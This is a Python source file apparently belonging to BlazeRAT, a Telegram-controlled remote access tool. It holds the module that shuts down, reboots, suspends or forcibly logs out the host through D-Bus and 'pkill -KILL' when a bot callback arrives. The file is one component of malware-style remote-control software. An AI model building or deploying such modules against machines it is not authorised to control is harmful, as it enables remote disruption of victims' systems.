#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from core.logger import Log
from os import system, getlogin
from dbus import SystemBus, Interface
from core.messages import services as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to control system power.
"""


# System bus
system_bus = SystemBus()
lg = system_bus.get_object(
    "org.freedesktop.login1",
    "/org/freedesktop/login1")
power_management = Interface(lg, "org.freedesktop.login1.Manager")

# PowerOff, Reboot, Suspend
def _GetMethod(name: str):
    return power_management.get_dbus_method(name)

# Shutdown computer
def Shutdown():
    _GetMethod("PowerOff")(True)

# Restart computer
def Restart():
    _GetMethod("Reboot")(True)

# Suspend computer
def Suspend():
    _GetMethod("Suspend")(True)

# Log out from current user
def LogOut():
    return system("pkill -KILL -u " + getlogin()) == 0

""" Handle telegram command """
def Handle(callback: dict, bot) -> None:
    action = callback.data.split("_")[1]
    chatid = callback.from_user.id

    Log("Power >> Send power event " + action, chatid)
    bot.send_message(chatid, Messages.power_received % action)

    try:
        if action == "SHUTDOWN":
            Shutdown()
        elif action == "REBOOT":
            Restart()
        elif action == "SUSPEND":
            Suspend()
        elif action == "LOGOUT":
            LogOut()
    except Exception as error:
        ex = f"Power >> Error while running {action} action\n{error}"
        Log(ex, chatid)
        bot.send_message(chatid, ex)

